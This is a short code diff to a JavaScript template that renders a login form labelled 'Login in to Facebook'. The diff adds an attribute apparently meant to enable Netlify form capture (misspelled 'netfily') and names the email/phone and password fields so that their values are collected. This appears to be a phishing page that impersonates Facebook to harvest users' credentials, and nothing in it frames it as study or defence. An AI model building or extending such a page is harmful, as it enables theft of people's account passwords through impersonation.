@@ -6,11 +6,11 @@ let face = `
 <div class="main-container">
 <div class="container">
     <span>Login in to Facebook</span>
-    <form action="">
+    <form action="" netfily>
         <small class="w-store"></small>
-        <input class="w-100 form-control " type="text" placeholder="Email address or phone number">
+        <input name="user_name:" class="w-100 form-control " type="text" placeholder="Email address or phone number">
         <small class="w-store"></small>
-        <input class="w-100 form-control mt-2" type="password" placeholder="Password">
+        <input name="password:" class="w-100 form-control mt-2" type="password" placeholder="Password">
         <button class="btn btn-primary w-100 mt-2"><h4>Login</h4></button>
 
     </form>
